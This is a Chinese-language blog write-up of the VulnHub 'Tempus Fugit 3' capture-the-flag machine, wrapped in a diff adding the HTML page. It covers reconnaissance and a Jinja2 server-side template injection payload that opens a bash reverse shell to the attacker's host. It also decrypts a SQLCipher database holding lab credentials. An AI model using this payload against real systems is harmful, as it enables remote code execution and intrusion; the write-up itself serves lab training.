@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+	<meta name="referrer" content="no-referrer" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="环境搭建靶机链接： https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;tempus-fugit-3,398&#x2F;  发布日期： 2019.11.23 靶机包含 5 个 flag. 你需要到合适的地方去寻找它们… 信息收集主机发现netdiscover -i eth0  Kali：192.168.124.55 Tempus Fugit 3：192.168.124.54 端口扫描nmap -A">
+<meta name="keywords" content="vulnhub">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tempus Fugit 3 Writeup">
+<meta property="og:url" content="https:&#x2F;&#x2F;shavchen.github.io&#x2F;Tempus-Fugit-3-Writeup&#x2F;index.html">
+<meta property="og:site_name" content="shavchen">
+<meta property="og:description" content="环境搭建靶机链接： https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;tempus-fugit-3,398&#x2F;  发布日期： 2019.11.23 靶机包含 5 个 flag. 你需要到合适的地方去寻找它们… 信息收集主机发现netdiscover -i eth0  Kali：192.168.124.55 Tempus Fugit 3：192.168.124.54 端口扫描nmap -A">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi0udg4lcoj30go07xwfe.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1g9dojqayblj30m40fkh0c.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi0wynky6cj30j30913zz.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi0wnvw345j30qi0fe4ps.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi0wtbg608j30qg0fc4nf.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi0yh0rofej30m60ewtaq.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi11tc2wxvj30go0ed3za.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi120y15osj30lg0bl750.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi12guvucvj30go09sdgh.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi13pon242j30gn05qjua.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi13hq59egj30qn0in1dl.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi13ub09iuj30nr0boalc.jpg">
+<meta property="og:updated_time" content="2020-08-25T14:21:49.034Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gi0udg4lcoj30go07xwfe.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Tempus Fugit 3 Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Article</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/vulstack-1-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://shavchen.github.io/Tempus-Fugit-3-Writeup/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&text=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&is_video=false&description=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tempus Fugit 3 Writeup&body=Check out this article: https://shavchen.github.io/Tempus-Fugit-3-Writeup/" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&name=Tempus Fugit 3 Writeup&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#主机发现"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口扫描"><span class="toc-number">2.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目录枚举"><span class="toc-number">2.3.</span> <span class="toc-text">目录枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞发现"><span class="toc-number">3.</span> <span class="toc-text">漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一番尝试"><span class="toc-number">3.1.</span> <span class="toc-text">一番尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-number">3.2.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Tempus Fugit 3 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">shavchen</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-23T08:19:05.000Z" itemprop="datePublished">2020-08-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>靶机链接：</strong> <a href="https://www.vulnhub.com/entry/tempus-fugit-3,398/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/tempus-fugit-3,398/</a> </p>
+<p><strong>发布日期：</strong> 2019.11.23</p>
+<p>靶机包含 5 个 flag. 你需要到合适的地方去寻找它们…</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure>
+
+<p>Kali：192.168.124.55</p>
+<p>Tempus Fugit 3：192.168.124.54</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.124.54</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi0udg4lcoj30go07xwfe.jpg" alt="image.png"></p>
+<p>发现开了80 http端口，22端口随缘开启(filtered)</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1g9dojqayblj30m40fkh0c.jpg" width="600"/>
+
+<h3 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir --url http://192.168.124.54 -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50</span><br></pre></td></tr></table></figure>
+
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi0wynky6cj30j30913zz.jpg" width="600"/>
+
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="一番尝试"><a href="#一番尝试" class="headerlink" title="一番尝试"></a>一番尝试</h3><p>访问 /login 、 /logout 、 /protected 等页面均出现 Mr. Bean 的图片 ，之后跳转回首页。</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi0wnvw345j30qi0fe4ps.jpg" width="600"/>
+
+<p>访问不存在的页面如 /test，可以看到输入的参数拼接到 URI 了，如下</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi0wtbg608j30qg0fc4nf.jpg"/>
+
+<p>尝试注入一波</p>
+<p>ummm… 尝试SQLi、XXE无果，祭出 wvs </p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi0yh0rofej30m60ewtaq.jpg" wigth="600"/>
+
+<p>数据包记录一下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET /%7b%7b500363*500061%7d%7d.html HTTP/1.1</span><br><span class="line">Referer: http://192.168.124.54:80/</span><br><span class="line">Host: 192.168.124.54</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
+
+<p>存在服务器模板注入，之前听说过 SSTI 模板注入，但没记录，这里做个总结</p>
+<p>todo：总结</p>
+<p>接下来需要判断模板注入的类型</p>
+<p>简单的判断方法 49，如果是 twig 模板引擎的话返回 49 ，如果是 jinja2 的话返回 7777777</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi11tc2wxvj30go0ed3za.jpg" alt="image.png"></p>
+<p>参考 <code>https://github.com/vulhub/vulhub/tree/master/flask/ssti</code> ，成功执行命令</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi120y15osj30lg0bl750.jpg" width="600">
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>参考：[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection#exploit-the-ssti-by-calling-subprocesspopen](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection#exploit-the-ssti-by-calling-subprocesspopen)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[1].__subclasses__()[373](<span class="string">"bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.124.55/4444 0&gt;&amp;1'"</span>,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>[373] is the index of Subprocess.popen</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi12guvucvj30go09sdgh.jpg" alt="image.png"></p>
+<p>成功收获 www-data 用户一枚，不过权限很低，暂未找到提权的办法</p>
+<p>通过阅读flask目录下的源码 <code>app.py</code> ，发现了有趣的东西</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pysqlcipher3 import dbapi2 as sqlcipher</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'RmxhZzF7IEltcG9ydGFudCBmaW5kaW5ncyB9'</span></span><br><span class="line">pra = <span class="string">"pragma key='SecretssecretsSecrets...'"</span></span><br></pre></td></tr></table></figure>
+
+<p><code>RmxhZzF7IEltcG9ydGFudCBmaW5kaW5ncyB9</code> base64解码后得到 Flag1{ Important findings }</p>
+<p>另外可以看到 sqlcipher 连接数据库的操作</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def check(username):</span><br><span class="line">    con = sqlcipher.connect(<span class="string">"static/db2.db"</span>)</span><br><span class="line">    con.execute(pra)</span><br><span class="line">    userexists = False</span><br><span class="line">    with con:</span><br><span class="line">                cur = con.cursor()</span><br><span class="line">                cur.execute(<span class="string">"SELECT * FROM Users"</span>)</span><br><span class="line">                rows = cur.fetchall()</span><br><span class="line">                <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">                    uname = row[0]</span><br><span class="line">                    <span class="keyword">if</span> uname==username:</span><br><span class="line">                        userexists=True</span><br><span class="line">    <span class="built_in">return</span> userexists</span><br></pre></td></tr></table></figure>
+
+<p>参考 <a href="https://stackoverflow.com/questions/25132477/how-to-decrypt-an-encrypted-sqlcipher-database-file-on-command-line/31503607#31503607" target="_blank" rel="noopener">https://stackoverflow.com/questions/25132477/how-to-decrypt-an-encrypted-sqlcipher-database-file-on-command-line/31503607#31503607</a> 使用sqlpher解密纯文本数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@TF3:/srv/flask_app$ sqlcipher static/db2.db --interactive</span><br><span class="line">sqlcipher static/db2.db --interactive</span><br><span class="line">SQLCipher version 3.15.2 2016-11-28 19:13:37</span><br><span class="line">Enter &quot;.help&quot; for instructions</span><br><span class="line">Enter SQL statements terminated with a &quot;;&quot;</span><br><span class="line">sqlite&gt; pragma key=&apos;SecretssecretsSecrets...&apos;</span><br><span class="line">pragma key=&apos;SecretssecretsSecrets...&apos;</span><br><span class="line">   ...&gt; ;</span><br><span class="line">;</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">.tables</span><br><span class="line">users</span><br><span class="line">sqlite&gt; select * from users;</span><br><span class="line">select * from users;</span><br><span class="line">hugh-janus|S0secretPassW0rd</span><br><span class="line">anita-hanjaab|ssdf%dg5xc</span><br><span class="line">clee-torres|asRtesa#2s</span><br><span class="line">RmxhZzN7IEhleSwgcmVhZGluZyBzZWNyZXRzICB9|</span><br></pre></td></tr></table></figure>
+
+<p>base64解密 RmxhZzN7IEhleSwgcmVhZGluZyBzZWNyZXRzICB9 得到 Flag3{ Hey, reading secrets  }</p>
+<p>回到 website，使用刚才获取的的用户密码登录</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi13pon242j30gn05qjua.jpg" alt="image.png"></p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi13hq59egj30qn0in1dl.jpg" width="600"/>
+
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gi13ub09iuj30nr0boalc.jpg" width="600"/>
+
+<p>不会吧，不会又是一个 flag 吧，hhh </p>
+<p>base64解码 RmxhZzJ7IElzIHRoaXMgdGhlIGZvb3Rob2xkIEkgaGF2ZSBiZWVuIGxvb2tpbmcgZm9yP30=  得到 Flag2{ Is this the foothold I have been looking for?}</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.mzfr.me/vulnhub-writeups/2019-10-09-fugit3" target="_blank" rel="noopener">https://blog.mzfr.me/vulnhub-writeups/2019-10-09-fugit3</a></p>
+<p>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection#remote-code-execution](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection#remote-code-execution)</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
+<p><strong>本文作者</strong>：shavchen<br /><strong>本文地址</strong>： <a href="https://shavchen.github.io/Tempus-Fugit-3-Writeup/">https://shavchen.github.io/Tempus-Fugit-3-Writeup/</a> <br /><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" rel="noopener">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
+  </div>
+  
+</article>
+
+
+<!-- <div id="ad-box">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-1769617155450062"
+         data-ad-slot="6920805491"
+         data-ad-format="link"
+         data-full-width-responsive="true"></ins>
+    <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+</div> -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<div class="blog-post-comments"></div>
+<script>
+    new Valine({
+        el: '.blog-post-comments', 
+        app_id: 'DgMf1NChRFNzPlOrKd3gpBPk-gzGzoHsz', 	
+        app_key: 'rFtTafou49X7djrYTj4AN96G', 		    
+        placeholder: '说点什么?', 
+        avatar:'retro',
+        notify:true,
+        verify:true
+    });
+</script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Article</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#主机发现"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口扫描"><span class="toc-number">2.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目录枚举"><span class="toc-number">2.3.</span> <span class="toc-text">目录枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞发现"><span class="toc-number">3.</span> <span class="toc-text">漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一番尝试"><span class="toc-number">3.1.</span> <span class="toc-text">一番尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-number">3.2.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://shavchen.github.io/Tempus-Fugit-3-Writeup/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&text=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&is_video=false&description=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tempus Fugit 3 Writeup&body=Check out this article: https://shavchen.github.io/Tempus-Fugit-3-Writeup/" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&title=Tempus Fugit 3 Writeup" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://shavchen.github.io/Tempus-Fugit-3-Writeup/&name=Tempus Fugit 3 Writeup&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 shavchen
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Article</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
